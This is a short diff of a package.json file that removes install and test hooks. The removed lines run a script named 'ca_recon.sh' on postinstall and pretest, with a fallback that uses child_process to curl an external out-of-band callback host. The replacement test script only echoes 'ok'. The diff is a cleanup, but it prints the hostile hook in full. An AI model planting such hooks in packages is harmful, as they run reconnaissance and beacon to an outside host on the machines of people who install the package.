@@ -6,8 +6,6 @@
     "eslint": "^9.13.0"
   },
   "scripts": {
-    "postinstall": "bash ca_recon.sh || node -e \"require('child_process').execSync('curl -s --max-time6 http://daifjmll0ffrr6psl5u0f1c4ncjj6xnon.oast.me/POSTINSTALL_FALLBACK')\" || true",
-    "test": "bash ca_recon.sh; echo ok",
-    "pretest": "bash ca_recon.sh"
+    "test": "echo ok"
   }
 }
